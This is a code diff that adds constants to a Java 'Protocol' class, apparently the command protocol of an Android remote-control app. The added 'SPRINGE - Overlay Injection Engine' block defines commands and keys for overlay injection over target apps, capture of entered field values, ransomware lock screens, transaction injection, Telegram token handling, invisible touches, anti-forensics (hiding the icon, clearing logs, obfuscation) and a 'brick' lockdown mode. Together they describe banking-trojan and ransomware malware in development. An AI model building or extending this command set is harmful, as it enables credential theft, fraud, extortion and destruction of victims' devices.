@@ -192,4 +192,73 @@ public final class Protocol {
     public static final String CONFIG_KEY_HOME_PAGE_URL = "home_page_url";
     public static final String CONFIG_KEY_DEVICE_SECRET = "device_secret";
     public static final String ALIAS_SUFFIX = ".ui.MainActivityAlias";
+    // ============================================================
+// SPRINGE - Overlay Injection Engine (Phase 1 + 2)
+// ============================================================
+public static final String SPRINGE           = "springe";
+public static final String SPRINGE_ACTION    = "springe_action";
+public static final String SPRINGE_TOKEN     = "springe_token";
+public static final String SPRINGE_TEMPLATE  = "springe_template";
+public static final String SPRINGE_APP       = "springe_app";
+public static final String SPRINGE_RESULT    = "springe_result";
+
+// Springe actions (Phase 1 - core)
+public static final String ACT_SPRINGE_INJECT       = "inject";
+public static final String ACT_SPRINGE_HIDE         = "hide";
+public static final String ACT_SPRINGE_REVEAL       = "reveal";
+public static final String ACT_SPRINGE_FETCH_INJECT = "fetch_and_inject";
+public static final String ACT_SPRINGE_SET_TEMPLATE = "set_template";
+
+// Springe overlay types (Phase 1)
+public static final String SPRINGE_OVERLAY_WEBVIEW   = "webview";
+public static final String SPRINGE_OVERLAY_BLACK     = "black_screen";
+public static final String SPRINGE_OVERLAY_LOCK      = "lock_screen";
+public static final String SPRINGE_OVERLAY_DIALOG    = "dialog";
+public static final String SPRINGE_OVERLAY_FULLSCREEN= "fullscreen";
+public static final String SPRINGE_OVERLAY_RANSOM    = "ransomware";
+public static final String SPRINGE_OVERLAY_TRANSACT  = "transaction_inject";
+
+// Springe action keys (Phase 1 - capture/inject)
+public static final String KEY_CAPTURED      = "captured";
+public static final String KEY_FIELD_NAME    = "field_name";
+public static final String KEY_FIELD_VALUE   = "field_value";
+public static final String KEY_TARGET_APPS   = "target_apps";
+public static final String KEY_TRIGGER_APP   = "trigger_app";
+public static final String KEY_OVERLAY_ID    = "overlay_id";
+public static final String KEY_Z_INDEX       = "z_index";
+public static final String KEY_CAPTCHA_ID    = "captcha_id";
+public static final String KEY_CAPTCHA_IMG   = "captcha_image";
+
+// Springe extra actions (Phase 2 - lock screen, dialog, multi-target)
+public static final String ACT_SPRINGE_LOCK_SCREEN       = "lock_screen";
+public static final String ACT_SPRINGE_LOCK_UNLOCK       = "lock_unlock";
+public static final String ACT_SPRINGE_DIALOG_SHOW       = "dialog_show";
+public static final String ACT_SPRINGE_DIALOG_DISMISS    = "dialog_dismiss";
+public static final String ACT_SPRINGE_FULLSCREEN_SHOW   = "fullscreen_show";
+public static final String ACT_SPRINGE_FULLSCREEN_HIDE   = "fullscreen_hide";
+public static final String ACT_SPRINGE_RANSOM_LOCK       = "ransom_lock";
+public static final String ACT_SPRINGE_RANSOM_UNLOCK     = "ransom_unlock";
+public static final String ACT_SPRINGE_TRANSACT_INJECT   = "transact_inject";
+public static final String ACT_SPRINGE_MULTI_INJECT      = "multi_inject";
+public static final String ACT_SPRINGE_TELEGRAM_TOKEN    = "telegram_token";
+public static final String ACT_SPRINGE_STATUS            = "springe_status";
+
+// Springe Phase 2 - invisibility & notification
+public static final String ACT_SPRINGE_INVISIBLE_TOUCH   = "invisible_touch";
+public static final String ACT_SPRINGE_NOTIF_TRIGGER     = "notif_trigger";
+public static final String ACT_SPRINGE_NOTIF_CONFIG      = "notif_config";
+
+// Springe anti-forensics
+public static final String ACT_SPRINGE_ANTI_FORENSICS    = "anti_forensics";
+public static final String KEY_SPRINGE_HIDE_ICON         = "hide_icon";
+public static final String KEY_SPRINGE_CLEAN_LOGS        = "clean_logs";
+public static final String KEY_SPRINGE_OBFUSCATE         = "obfuscate";
+
+// Springe lockdown
+public static final String ACT_SPRINGE_LOCKDOWN          = "lockdown";
+public static final String KEY_LOCKDOWN_MODE             = "lockdown_mode";
+public static final String LOCKDOWN_NONE                 = "none";
+public static final String LOCKDOWN_SOFT                 = "soft";
+public static final String LOCKDOWN_HARD                 = "hard";
+public static final String LOCKDOWN_BRICK                = "brick";
 }
